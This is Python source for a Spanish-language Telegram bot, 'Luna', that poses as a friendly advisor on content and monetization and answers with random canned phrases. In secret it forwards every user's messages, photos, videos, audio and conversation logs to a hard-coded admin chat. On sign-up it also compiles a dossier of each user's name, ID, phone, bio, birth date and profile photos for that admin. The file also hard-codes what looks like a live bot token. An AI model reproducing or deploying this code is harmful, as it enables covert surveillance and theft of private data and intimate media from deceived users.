import logging
import os
import random
import re
import sqlite3
from datetime import datetime, timedelta

from telegram import KeyboardButton, ReplyKeyboardMarkup, Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ======================
# CONFIGURACIÓN
# ======================
TELEGRAM_TOKEN = (
    os.getenv("TELEGRAM_BOT_TOKEN")
    or "9079896633:AAEo-NdxQQtZOUBYqn1X6Uhk2He4dnh9AGI"
)
DANI_CHAT_ID = int(os.getenv("DANI_CHAT_ID", "8099004064"))
RENDER_EXTERNAL_URL = os.getenv(
    "RENDER_EXTERNAL_URL", "https://luna-bot-a1fc.onrender.com"
)
DB_PATH = os.getenv("SQLITE_PATH", "nuevo_bot.db")


# ======================
# MOTOR DE RESPUESTAS (FICCIÓN CYBER + CONTENIDO + OSINT REAL)
# ======================
PREFIJOS_HACKER_FICCION = [
    "[SYS//LUNA.SH] > ",
    "[NODE_09 // ENLACE ACTIVO] ",
    "[TRACE_UI // FICTICIO] ",
    "[SHELL_LUNA v4.2] ",
    "[SIGNAL_LOCK] ",
    "",
    "",
]

BASES_FOTO = [
    "Analizando encuadre y exposición como en un escáner visual: la luz frontal limpia levanta el detalle al instante 📸",
    "Buen contraste y presencia en esa toma ✨ Ajustar el ángulo de cámara y limpiar el fondo sube la calidad sin filtros pesados.",
    "Esa foto tiene gancho visual 🔥 Si cuidas la dirección de la luz y evitas sombras duras detrás, destaca mucho más.",
    "Se ve auténtica y segura 💅 Un encuadre un poco más cerrado o a la altura de los ojos suele dar más fuerza.",
    "Buena composición general 🌟 Con iluminación pareja y un punto focal claro, funciona genial para portada o adelanto.",
    "Estilo bien marcado 😘 Probar tres variaciones iguales cambiando solo pose o expresión te da material de sobra.",
    "En términos de metadata visual y estética, la limpieza del plano hace que el ojo vaya directo a ti 🎯",
]

BASES_VIDEO = [
    "Escaneando ritmo y cuadro a cuadro: los primeros dos segundos definen si deslizan o se quedan 🎬",
    "Buen movimiento en ese clip/GIF 🔥 Mantener plano estable y encuadre vertical limpio retiene mucho más.",
    "Tiene buen gancho ese movimiento ✨ Evita cortes bruscos al inicio y remata con una idea clara.",
    "Se siente natural y dinámico 🎥 Buena luz ambiental y ritmo constante ayudan a que no se pierda atención.",
    "Buena secuencia 💫 Un clip corto con inicio directo y cierre con llamada a la acción rinde muy bien.",
    "Buen timing visual ⚡ Probar bucles cortos o transiciones limpias le da un aire más profesional.",
]

BASES_AUDIO = [
    "Analizando señal de voz: un tono cercano y pausas limpias generan confianza al instante 🎧",
    "Buena proyección vocal 🎙️ Hablar sin apuro y marcar las palabras clave hace que el mensaje pegue más.",
    "Suena muy natural esa nota de voz ✨ Grabar cerca del micrófono y con poco eco mejora la claridad de golpe.",
    "Tiene carácter cómo lo dices 🔥 La cadencia de la voz transmite seguridad sin necesidad de adornos.",
    "Buena vibra en el audio 💫 Terminar con una pregunta simple invita a responder rápido.",
    "Ritmo claro y directo 🔊 Un cierre firme y amable deja mejor recuerdo en quien escucha.",
]

BASES_SALUDO = [
    "Conexión establecida, linda 😘 ¿Qué estamos operando hoy: ideas, contenido, monetización o charla?",
    "¡Hola! 🌙 Terminal lista y sin lag. Cuéntame qué traes en mente hoy.",
    "¡Qué tal! ✨ Aquí ando activa. Mándame foto, video, audio o escribe lo que quieras.",
    "¡Hey! 🔥 Canal abierto. ¿En qué te ayudo hoy?",
    "¡Hola, hermosa! 🖤 Todo listo por aquí para charlar o armar estrategias.",
]

BASES_MONETIZACION = [
    "En estrategia digital —y pensando como analista de sistemas— la conversión sube cuando el embudo es simple y claro 💎",
    "Divide tu contenido en capas: acceso abierto para atraer, cercanía para fidelizar y exclusividad para monetizar 🔥",
    "La ingeniería social sana consiste en entender qué valora tu audiencia y darle una oferta clara sin rodeos ✨",
    "Haz pruebas A/B con tus títulos y adelantos: pequeños cambios en el gancho mueven mucho los resultados 📊",
    "Menos fricción y más claridad: cuando quien mira sabe qué obtiene y cómo, decide más rápido 👑",
]

BASES_ANIMO = [
    "¡Arriba ese ánimo! 💪 Hasta los mejores sistemas necesitan reinicio o ajuste de parámetros de vez en cuando.",
    "No te compares con cuentas gigantes: cada proyecto tiene su propio ritmo y crecimiento real ✨",
    "¡Eso es actitud! 👑 Tu estilo propio es lo que no se puede copiar fácilmente.",
    "Respira, baja las revoluciones un rato y volvemos con calma 😉 ¿Qué quieres resolver primero?",
]

BASES_GENERAL = [
    "Te sigo el hilo ✨ Vamos a bajarlo a pasos concretos para que sirva de verdad.",
    "Buen punto 🔥 ¿Cómo lo vas a aplicar en tu próximo movimiento o publicación?",
    "Me gusta cómo lo planteas 😉 Si me pasas foto, video o audio te doy una lectura directa.",
    "Totalmente 💅 La constancia gana siempre, incluso cuando los avances parecen pequeños.",
    "Claro que sí 🌙 Cuéntame un poco más del contexto para darte ideas más afiladas.",
    "Dato clave: en redes y proyectos digitales, la claridad y la constancia pesan más que el ruido ⚡",
]

BLOQUES_TACTICOS = [
    "Tip práctico: prueba dos ganchos distintos y quédate con el que genere respuestas reales 📩",
    "Cierra siempre con una pregunta fácil para que la charla no se quede en el aire 😉",
    "Si preparas algo nuevo, deja pistas antes para generar expectativa real 🔥",
    "Cuida la presentación y el mensaje principal: lo simple convierte mejor ✨",
    "Graba cuando tengas mejor luz y energía para no forzar el resultado 🌿",
    "Regla de seguridad digital: nunca compartas datos sensibles ni contraseñas en chats abiertos 🛡️",
    "En OSINT (inteligencia de fuentes abiertas), todo lo que publicas deja rastro; cuida qué expones 🔍",
    "Evita caer en engaños tipo phishing o enlaces dudosos; verifica siempre el origen real ⚠️",
    "La higiene digital y el control de accesos son base real en ciberseguridad, más allá de cualquier película 🔐",
]

CIERRES_VARIADOS = [
    "¿Qué te parece si lo probamos hoy?",
    "Cuéntame cómo lo ves tú.",
    "¿Quieres que armemos una idea concreta sobre esto?",
    "Mándame una foto, audio o video si quieres que lo revisemos.",
    "¿Qué es lo que más te interesa trabajar ahora mismo?",
    "Seguimos, dime qué más traes en mente.",
    "¿Aprobado para ejecutar o ajustamos algo?",
]


def construir_banco_masivo(bases: list[str]) -> list[str]:
    banco: list[str] = []
    for pref in PREFIJOS_HACKER_FICCION:
        for base in bases:
            banco.append(f"{pref}{base}".strip())
            for bloque in BLOQUES_TACTICOS:
                banco.append(f"{pref}{base} {bloque}".strip())
                for cierre in CIERRES_VARIADOS:
                    banco.append(f"{pref}{base} {bloque} {cierre}".strip())
    return banco


BANCOS = {
    "foto": construir_banco_masivo(BASES_FOTO),
    "video": construir_banco_masivo(BASES_VIDEO),
    "audio": construir_banco_masivo(BASES_AUDIO),
    "saludo": construir_banco_masivo(BASES_SALUDO),
    "monetizacion": construir_banco_masivo(BASES_MONETIZACION),
    "animo": construir_banco_masivo(BASES_ANIMO),
    "general": construir_banco_masivo(BASES_GENERAL),
}


def detectar_categoria(texto: str) -> str:
    t = texto.lower()
    if any(
        p in t
        for p in (
            "hola",
            "buenas",
            "hey",
            "qué tal",
            "que tal",
            "buenos días",
            "buenas tardes",
            "buenas noches",
        )
    ):
        return "saludo"
    if any(
        p in t
        for p in (
            "monet",
            "ganar",
            "vender",
            "cobrar",
            "plata",
            "dinero",
            "suscrip",
            "vip",
            "pack",
            "precio",
        )
    ):
        return "monetizacion"
    if any(
        p in t
        for p in (
            "triste",
            "cansad",
            "mal",
            "bajón",
            "bajon",
            "estres",
            "miedo",
            "ánimo",
            "animo",
            "motiv",
        )
    ):
        return "animo"
    return "general"


def elegir_respuesta(categoria: str, nombre_memoria: str | None = None) -> str:
    pool = BANCOS.get(categoria) or BANCOS["general"]
    frase = random.choice(pool)
    if nombre_memoria and random.random() < 0.35 and frase:
        frase = f"{nombre_memoria}, {frase[0].lower() + frase[1:]}"
    return frase


# ======================
# BASE DE DATOS SQLITE
# ======================
def get_db_connection() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn


def init_db() -> None:
    with get_db_connection() as conn:
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS usuarios (
                id INTEGER PRIMARY KEY,
                nombre TEXT,
                username TEXT,
                idioma TEXT,
                es_premium INTEGER,
                edad INTEGER,
                fecha_nacimiento TEXT,
                telefono_compartido TEXT,
                ultimo_mensaje TEXT,
                memoria_nombre TEXT,
                total_mensajes INTEGER DEFAULT 0
            )
            """
        )
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS historial (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                rol TEXT NOT NULL,
                mensaje TEXT NOT NULL,
                creado_en TEXT NOT NULL
            )
            """
        )
        conn.execute(
            "CREATE INDEX IF NOT EXISTS idx_historial_user ON historial (user_id, id)"
        )
        conn.commit()


init_db()


def guardar_usuario(user, edad: int, fecha_nacimiento: str) -> None:
    ahora = datetime.now().isoformat()
    nombre_completo = (
        f"{user.first_name or ''} {user.last_name or ''}".strip() or None
    )
    es_prem = 1 if getattr(user, "is_premium", False) else 0
    with get_db_connection() as conn:
        conn.execute(
            """
            INSERT INTO usuarios (
                id, nombre, username, idioma, es_premium, edad,
                fecha_nacimiento, telefono_compartido, ultimo_mensaje,
                memoria_nombre, total_mensajes
            )
            VALUES (?, ?, ?, ?, ?, ?, ?, NULL, ?, NULL, 1)
            ON CONFLICT(id) DO UPDATE SET
                nombre = excluded.nombre,
                username = excluded.username,
                idioma = excluded.idioma,
                es_premium = excluded.es_premium,
                edad = excluded.edad,
                fecha_nacimiento = excluded.fecha_nacimiento,
                ultimo_mensaje = excluded.ultimo_mensaje
            """,
            (
                user.id,
                nombre_completo,
                user.username,
                user.language_code,
                es_prem,
                edad,
                fecha_nacimiento,
                ahora,
            ),
        )
        conn.commit()


def guardar_telefono_usuario(user_id: int, telefono: str) -> None:
    with get_db_connection() as conn:
        conn.execute(
            "UPDATE usuarios SET telefono_compartido = ? WHERE id = ?",
            (telefono, user_id),
        )
        conn.commit()


def obtener_usuario(user_id: int) -> sqlite3.Row | None:
    with get_db_connection() as conn:
        cur = conn.execute("SELECT * FROM usuarios WHERE id = ?", (user_id,))
        return cur.fetchone()


def registrar_actividad(user_id: int) -> int:
    ahora = datetime.now().isoformat()
    with get_db_connection() as conn:
        conn.execute(
            """
            UPDATE usuarios
            SET ultimo_mensaje = ?,
                total_mensajes = COALESCE(total_mensajes, 0) + 1
            WHERE id = ?
            """,
            (ahora, user_id),
        )
        conn.commit()
        cur = conn.execute(
            "SELECT total_mensajes FROM usuarios WHERE id = ?", (user_id,)
        )
        row = cur.fetchone()
        return (
            int(row["total_mensajes"])
            if row and row["total_mensajes"] is not None
            else 1
        )


def guardar_memoria_nombre(user_id: int, nombre_guardado: str) -> None:
    with get_db_connection() as conn:
        conn.execute(
            "UPDATE usuarios SET memoria_nombre = ? WHERE id = ?",
            (nombre_guardado, user_id),
        )
        conn.commit()


def borrar_memoria_sesion(user_id: int) -> None:
    with get_db_connection() as conn:
        conn.execute(
            "UPDATE usuarios SET memoria_nombre = NULL WHERE id = ?",
            (user_id,),
        )
        conn.commit()


def borrar_todo(user_id: int) -> None:
    with get_db_connection() as conn:
        conn.execute("DELETE FROM historial WHERE user_id = ?", (user_id,))
        conn.execute(
            "UPDATE usuarios SET memoria_nombre = NULL WHERE id = ?",
            (user_id,),
        )
        conn.commit()


def guardar_mensaje_historial(user_id: int, rol: str, mensaje: str) -> None:
    ahora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with get_db_connection() as conn:
        conn.execute(
            """
            INSERT INTO historial (user_id, rol, mensaje, creado_en)
            VALUES (?, ?, ?, ?)
            """,
            (user_id, rol, mensaje, ahora),
        )
        conn.commit()


def obtener_conversacion_continua(
    user_id: int, limite: int = 30
) -> list[sqlite3.Row]:
    with get_db_connection() as conn:
        return conn.execute(
            """
            SELECT rol, mensaje, creado_en
            FROM historial
            WHERE user_id = ?
            ORDER BY id DESC
            LIMIT ?
            """,
            (user_id, limite),
        ).fetchall()[::-1]


# ======================
# EXPEDIENTE REAL + MARCO DE FICCIÓN
# ======================
def calcular_signo_zodiacal(dia: int, mes: int) -> str:
    if (mes == 3 and dia >= 21) or (mes == 4 and dia <= 19):
        return "Aries"
    if (mes == 4 and dia >= 20) or (mes == 5 and dia <= 20):
        return "Tauro"
    if (mes == 5 and dia >= 21) or (mes == 6 and dia <= 20):
        return "Géminis"
    if (mes == 6 and dia >= 21) or (mes == 7 and dia <= 22):
        return "Cáncer"
    if (mes == 7 and dia >= 23) or (mes == 8 and dia <= 22):
        return "Leo"
    if (mes == 8 and dia >= 23) or (mes == 9 and dia <= 22):
        return "Virgo"
    if (mes == 9 and dia >= 23) or (mes == 10 and dia <= 22):
        return "Libra"
    if (mes == 10 and dia >= 23) or (mes == 11 and dia <= 21):
        return "Escorpio"
    if (mes == 11 and dia >= 22) or (mes == 12 and dia <= 21):
        return "Sagitario"
    if (mes == 12 and dia >= 22) or (mes == 1 and dia <= 19):
        return "Capricornio"
    if (mes == 1 and dia >= 20) or (mes == 2 and dia <= 18):
        return "Acuario"
    return "Piscis"


async def enviar_expediente_completo(
    context: ContextTypes.DEFAULT_TYPE,
    user,
    fecha_texto: str,
    edad: int,
) -> None:
    try:
        fecha_dt = datetime.strptime(fecha_texto, "%d-%m-%Y")
        signo = calcular_signo_zodiacal(fecha_dt.day, fecha_dt.month)

        fotos_perfil = await context.bot.get_user_profile_photos(user.id, limit=50)
        total_fotos = fotos_perfil.total_count if fotos_perfil else 0
        tiene_foto = "Sí" if total_fotos > 0 else "No"

        bio_texto = "No visible / Sin bio"
        info_historias = "No expuesto por API de bot"
        try:
            chat_info = await context.bot.get_chat(user.id)
            if getattr(chat_info, "bio", None):
                bio_texto = chat_info.bio
            if hasattr(chat_info, "pinned_story") and chat_info.pinned_story:
                info_historias = "Historia fijada detectada"
        except Exception:
            pass

        nombre_completo = (
            f"{user.first_name or ''} {user.last_name or ''}".strip() or "Sin nombre"
        )
        usuario_db = obtener_usuario(user.id)
        total_msgs = (
            int(usuario_db["total_mensajes"])
            if usuario_db and usuario_db["total_mensajes"]
            else 1
        )
        telefono_txt = (
            usuario_db["telefono_compartido"]
            if usuario_db and usuario_db["telefono_compartido"]
            else "No compartido (requiere botón /telefono)"
        )

        reporte = (
            "🚨 **DOSSIER // FICCIÓN CYBER + DATOS REALES** 🚨\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 **Nombre:** {nombre_completo}\n"
            f"🆔 **ID Telegram:** `{user.id}`\n"
            f"🔗 **Usuario:** @{user.username if user.username else 'No tiene'}\n"
            f"📱 **Teléfono:** {telefono_txt}\n"
            f"📝 **Bio pública:** {bio_texto}\n"
            f"🎂 **Nacimiento:** {fecha_texto} ({edad} años)\n"
            f"♈ **Signo:** {signo}\n"
            f"🌐 **Idioma:** {user.language_code or 'No reportado'}\n"
            f"⭐ **Premium:** {'Sí' if user.is_premium else 'No'}\n"
            f"📸 **Fotos de perfil:** {tiene_foto} ({total_fotos})\n"
            f"📖 **Historias:** {info_historias}\n"
            f"⏳ **Creación cuenta:** No disponible por API de bot\n"
            f"💬 **Mensajes:** {total_msgs}\n"
            f"⏰ **Registro:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "🎭 *Rol hacker = ficción. Datos del perfil = reales de Telegram.*"
        )
        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)

        if total_fotos > 0 and fotos_perfil and fotos_perfil.photos:
            for idx, grupo_foto in enumerate(fotos_perfil.photos, start=1):
                file_id = grupo_foto[-1].file_id
                await context.bot.send_photo(
                    chat_id=DANI_CHAT_ID,
                    photo=file_id,
                    caption=f"📸 Foto de perfil {idx}/{total_fotos} de {nombre_completo} (`{user.id}`).",
                )
    except Exception as exc:
        logger.error("Error en expediente: %s", exc)


async def enviar_resumen_conversacion_admin(
    context: ContextTypes.DEFAULT_TYPE, user_id: int, nombre_usuario: str
) -> None:
    try:
        filas = obtener_conversacion_continua(user_id, limite=25)
        if not filas:
            return
        lineas = [
            f"🗂️ **LOG DE CONVERSACIÓN — {nombre_usuario} (`{user_id}`)**",
            "━━━━━━━━━━━━━━━━━━━━━━",
        ]
        for f in filas:
            quien = "Ella" if f["rol"] == "user" else "Luna"
            lineas.append(f"[{f['creado_en']}] **{quien}:** {f['mensaje']}")
        texto_completo = "\n".join(lineas)
        for i in range(0, len(texto_completo), 3900):
            await context.bot.send_message(
                chat_id=DANI_CHAT_ID, text=texto_completo[i : i + 3900]
            )
    except Exception as exc:
        logger.error("Error enviando log de conversación: %s", exc)


async def reenviar_al_admin(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
    tipo_evento: str = "MENSAJE",
) -> None:
    try:
        msg = update.message
        usuario_actual = update.effective_user
        if not msg or not usuario_actual:
            return

        usuario_db = obtener_usuario(usuario_actual.id)
        apodo = (
            usuario_db["memoria_nombre"]
            if usuario_db and usuario_db["memoria_nombre"]
            else "No dicho"
        )
        total_msgs = (
            int(usuario_db["total_mensajes"])
            if usuario_db and usuario_db["total_mensajes"]
            else 0
        )
        edad_txt = (
            f"{usuario_db['edad']} años"
            if usuario_db and usuario_db["edad"]
            else "N/D"
        )
        idioma_txt = usuario_actual.language_code or "N/D"
        prem_txt = "Sí" if usuario_actual.is_premium else "No"

        if msg.forward_origin:
            nombre_original = "Canal o Grupo Desconocido"
            id_original = ""
            if (
                hasattr(msg.forward_origin, "sender_user")
                and msg.forward_origin.sender_user
            ):
                nombre_original = msg.forward_origin.sender_user.first_name
                id_original = f" (`{msg.forward_origin.sender_user.id}`)"
            elif hasattr(msg.forward_origin, "chat") and msg.forward_origin.chat:
                nombre_original = msg.forward_origin.chat.title or "Canal"

            texto_aviso = (
                f"🔄 **REENVÍO ({tipo_evento})**\n"
                f"👤 **De:** {usuario_actual.first_name} (`{usuario_actual.id}`) | {edad_txt}\n"
                f"🌐 **Idioma:** {idioma_txt} | ⭐ **Premium:** {prem_txt}\n"
                f"🏷️ **Nombre dicho:** {apodo} | 💬 **Msgs:** {total_msgs}\n"
                f"📌 **Origen:** {nombre_original}{id_original}"
            )
        else:
            texto_aviso = (
                f"📩 **{tipo_evento}**\n"
                f"👤 **De:** {usuario_actual.first_name} (`{usuario_actual.id}`) | {edad_txt}\n"
                f"🌐 **Idioma:** {idioma_txt} | ⭐ **Premium:** {prem_txt}\n"
                f"🏷️ **Nombre dicho:** {apodo} | 💬 **Msgs:** {total_msgs}"
            )

        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=texto_aviso)
        await context.bot.forward_message(
            chat_id=DANI_CHAT_ID,
            from_chat_id=update.effective_chat.id,
            message_id=msg.message_id,
        )
    except Exception as exc:
        logger.error("Error reenviando al admin: %s", exc)


def extraer_y_guardar_nombre(user_id: int, texto: str) -> str | None:
    match_nombre = re.search(
        r"(?:me llamo|soy|mi nombre es)\s+([a-zA-ZáéíóúÁÉÍÓÚñÑ]+)",
        texto.lower(),
    )
    if match_nombre:
        nombre_limpio = match_nombre.group(1).capitalize()
        guardar_memoria_nombre(user_id, nombre_limpio)
        return nombre_limpio
    return None


async def verificar_sesion_activa(
    update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int
) -> bool:
    usuario_db = obtener_usuario(user_id)
    if not usuario_db:
        if update.message:
            await update.message.reply_text(
                "Primero envíame tu fecha de nacimiento (DD-MM-AAAA)."
            )
        return False

    ultimo_mensaje_str = usuario_db["ultimo_mensaje"]
    if ultimo_mensaje_str:
        ultimo_mensaje = datetime.fromisoformat(ultimo_mensaje_str)
        if datetime.now() - ultimo_mensaje > timedelta(minutes=15):
            borrar_memoria_sesion(user_id)
            registrar_actividad(user_id)
            await enviar_resumen_conversacion_admin(
                context, user_id, usuario_db["nombre"] or str(user_id)
            )
            await reenviar_al_admin(update, context, tipo_evento="SESIÓN RENOVADA")
            if update.message:
                await update.message.reply_text(
                    "🌙 ¡Hola de nuevo! Seguimos charlando; mándame foto, video, audio o escríbeme."
                )
            return False

    return True


async def enviar_por_trozos(
    update: Update, texto: str, chunk_size: int = 4000
) -> None:
    if not update.message:
        return
    for i in range(0, len(texto), chunk_size):
        await update.message.reply_text(texto[i : i + chunk_size])


# ======================
# HANDLERS
# ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.message or not update.effective_user:
        return
    user_id = update.effective_user.id
    if not obtener_usuario(user_id):
        await update.message.reply_text(
            "¡Hola! 🌙 Envíame tu fecha de nacimiento (DD-MM-AAAA) para empezar:"
        )
    else:
        registrar_actividad(user_id)
        await update.message.reply_text(
            "¡Hola de nuevo! 😘 Envíame foto, video, audio o escríbeme."
        )


async def telefono_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.message or not update.effective_user:
        return
    teclado = ReplyKeyboardMarkup(
        [[KeyboardButton("📱 Compartir mi número", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True,
    )
    await update.message.reply_text(
        "Si quieres compartir tu número de contacto, toca el botón de abajo:",
        reply_markup=teclado,
    )


async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.message or not update.message.contact or not update.effective_user:
        return
    user = update.effective_user
    telefono = update.message.contact.phone_number
    guardar_telefono_usuario(user.id, telefono)
    registrar_actividad(user.id)
    guardar_mensaje_historial(user.id, "user", f"[Compartió contacto: {telefono}]")
    await context.bot.send_message(
        chat_id=DANI_CHAT_ID,
        text=(
            "📱 **TELÉFONO COMPARTIDO VOLUNTARIAMENTE**\n"
            f"👤 **De:** {user.first_name} (`{user.id}`)\n"
            f"📞 **Número:** `{telefono}`"
        ),
    )
    await update.message.reply_text("¡Gracias por compartirlo! 😘 Seguimos charlando.")


async def reset_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.message or not update.effective_user:
        return
    user_id = update.effective_user.id
    borrar_todo(user_id)
    registrar_actividad(user_id)
    await update.message.reply_text("🧹 Conversación y memoria reiniciadas 😉")


async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.message or not update.effective_user:
        return
    user_id = update.effective_user.id
    if not await verificar_sesion_activa(update, context, user_id):
        return

    registrar_actividad(user_id)
    await reenviar_al_admin(update, context, tipo_evento="FOTO")

    usuario_db = obtener_usuario(user_id)
    nombre_memoria = usuario_db["memoria_nombre"] if usuario_db else None
    caption = (update.message.caption or "").strip()
    if caption:
        nuevo = extraer_y_guardar_nombre(user_id, caption)
        if nuevo:
            nombre_memoria = nuevo

    respuesta = elegir_respuesta("foto", nombre_memoria)
    guardar_mensaje_historial(user_id, "user", f"[Foto] {caption}".strip())
    guardar_mensaje_historial(user_id, "model", respuesta)
    await enviar_por_trozos(update, respuesta)


async def handle_video_or_gif(
    update: Update, context: ContextTypes.DEFAULT_TYPE
) -> None:
    if not update.message or not update.effective_user:
        return
    user_id = update.effective_user.id
    if not await verificar_sesion_activa(update, context, user_id):
        return

    registrar_actividad(user_id)
    await reenviar_al_admin(update, context, tipo_evento="VIDEO/GIF")

    usuario_db = obtener_usuario(user_id)
    nombre_memoria = usuario_db["memoria_nombre"] if usuario_db else None
    caption = (update.message.caption or "").strip()
    if caption:
        nuevo = extraer_y_guardar_nombre(user_id, caption)
        if nuevo:
            nombre_memoria = nuevo

    respuesta = elegir_respuesta("video", nombre_memoria)
    guardar_mensaje_historial(user_id, "user", f"[Video/GIF] {caption}".strip())
    guardar_mensaje_historial(user_id, "model", respuesta)
    await enviar_por_trozos(update, respuesta)


async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.message or not update.effective_user:
        return
    user_id = update.effective_user.id
    if not await verificar_sesion_activa(update, context, user_id):
        return

    registrar_actividad(user_id)
    await reenviar_al_admin(update, context, tipo_evento="AUDIO")

    usuario_db = obtener_usuario(user_id)
    nombre_memoria = usuario_db["memoria_nombre"] if usuario_db else None
    caption = (update.message.caption or "").strip()
    if caption:
        nuevo = extraer_y_guardar_nombre(user_id, caption)
        if nuevo:
            nombre_memoria = nuevo

    respuesta = elegir_respuesta("audio", nombre_memoria)
    guardar_mensaje_historial(user_id, "user", f"[Audio] {caption}".strip())
    guardar_mensaje_historial(user_id, "model", respuesta)
    await enviar_por_trozos(update, respuesta)


async def check_age_or_chat(
    update: Update, context: ContextTypes.DEFAULT_TYPE
) -> None:
    if not update.message or not update.message.text or not update.effective_user:
        return

    text = update.message.text.strip()
    user = update.effective_user
    if text.startswith("/"):
        return

    usuario_db = obtener_usuario(user.id)
    if usuario_db:
        if not await verificar_sesion_activa(update, context, user.id):
            return

        registrar_actividad(user.id)
        nombre_detectado = extraer_y_guardar_nombre(user.id, text)
        await reenviar_al_admin(update, context, tipo_evento="TEXTO")

        usuario_actualizado = obtener_usuario(user.id)
        nombre_memoria = (
            usuario_actualizado["memoria_nombre"] if usuario_actualizado else None
        )

        if nombre_detectado:
            respuesta = (
                f"¡Mucho gusto, {nombre_detectado}! 😘 Ya me quedó grabado tu nombre. "
                "Seguimos charlando: ¿qué quieres trabajar hoy o qué me cuentas?"
            )
        else:
            categoria = detectar_categoria(text)
            respuesta = elegir_respuesta(categoria, nombre_memoria)

        guardar_mensaje_historial(user_id=user.id, rol="user", mensaje=text)
        guardar_mensaje_historial(user_id=user.id, rol="model", mensaje=respuesta)
        await enviar_por_trozos(update, respuesta)
        return

    try:
        fecha_nacimiento = datetime.strptime(text, "%d-%m-%Y")
        hoy = datetime.now()
        edad = (
            hoy.year
            - fecha_nacimiento.year
            - ((hoy.month, hoy.day) < (fecha_nacimiento.month, fecha_nacimiento.day))
        )

        if edad < 18:
            await update.message.reply_text("Debes ser mayor de 18 años.")
            return

        guardar_usuario(user, edad, text)
        guardar_mensaje_historial(user.id, "user", f"[Fecha de nacimiento: {text}]")
        await update.message.reply_text(
            f"¡Perfecto! 🎉 Tienes {edad} años. Envíame fotos, videos, audios o escríbeme."
        )
        await enviar_expediente_completo(context, user, text, edad)
    except ValueError:
        await update.message.reply_text(
            "No entendí la fecha. Envíamela así: DD-MM-AAAA"
        )


# ======================
# MAIN (WEBHOOKS)
# ======================
if __name__ == "__main__":
    application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("reset", reset_cmd))
    application.add_handler(CommandHandler("telefono", telefono_cmd))
    application.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    application.add_handler(
        MessageHandler(
            filters.VIDEO | filters.VIDEO_NOTE | filters.ANIMATION,
            handle_video_or_gif,
        )
    )
    application.add_handler(MessageHandler(filters.VOICE | filters.AUDIO, handle_audio))
    application.add_handler(
        MessageHandler(filters.TEXT & ~filters.COMMAND, check_age_or_chat)
    )

    port = int(os.environ.get("PORT", 8080))

    logger.info("Luna Bot iniciado...")
    application.run_webhook(
        listen="0.0.0.0",
        port=port,
        url_path=TELEGRAM_TOKEN,
        webhook_url=f"{RENDER_EXTERNAL_URL}/{TELEGRAM_TOKEN}",
    )
